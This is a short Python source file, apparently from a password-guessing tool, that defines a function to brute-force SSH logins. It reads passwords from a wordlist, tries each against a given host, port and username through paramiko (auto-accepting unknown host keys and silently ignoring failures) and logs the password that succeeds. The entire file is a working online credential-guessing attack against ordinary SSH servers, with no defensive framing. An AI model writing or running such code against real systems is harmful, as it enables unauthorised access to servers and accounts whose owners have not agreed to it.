import logging
from src.config import MESSAGES
import paramiko




def bruteforce_ssh(adress, port, username, wordlist, threads, noi):
    password_list = open(wordlist,'r').readlines()
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for i in range(noi,len(password_list),threads):
        password = password_list[i].split('\n')[0]
        try:
            client.connect(hostname=adress, port=port, username=username, password=password)
            logging.info(f'{MESSAGES["password_found"]}{password}')
            exit()
        except:
            pass

    # close the SSH client
    client.close()